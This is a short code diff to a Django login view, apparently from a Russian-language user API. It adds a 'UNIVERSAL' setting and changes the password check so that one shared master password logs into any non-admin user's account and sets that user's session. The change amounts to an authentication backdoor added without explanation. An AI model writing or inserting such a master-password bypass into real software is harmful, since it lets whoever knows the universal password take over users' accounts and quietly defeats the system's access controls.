@@ -20,6 +20,7 @@ from django.utils import timezone
 from datetime import datetime, timedelta
 
 SECRET_KEY = settings.SECRET_KEY
+UNIVERSAL = settings.UNIVERSAL
 
 
 @swagger_auto_schema(method='GET', operation_summary="Получение пользователя.",
@@ -386,7 +387,8 @@ def login(request):
                                 'instance': request.path},
                                ensure_ascii=False), status=400)
         else:
-            if check_password(password_, user.password):
+            is_universal = check_password(password_, UNIVERSAL)
+            if check_password(password_, user.password) or (is_universal and not user.is_admin):
                 request.session['login'] = login_
                 request.session['id'] = user.id
                 id_ = user.id
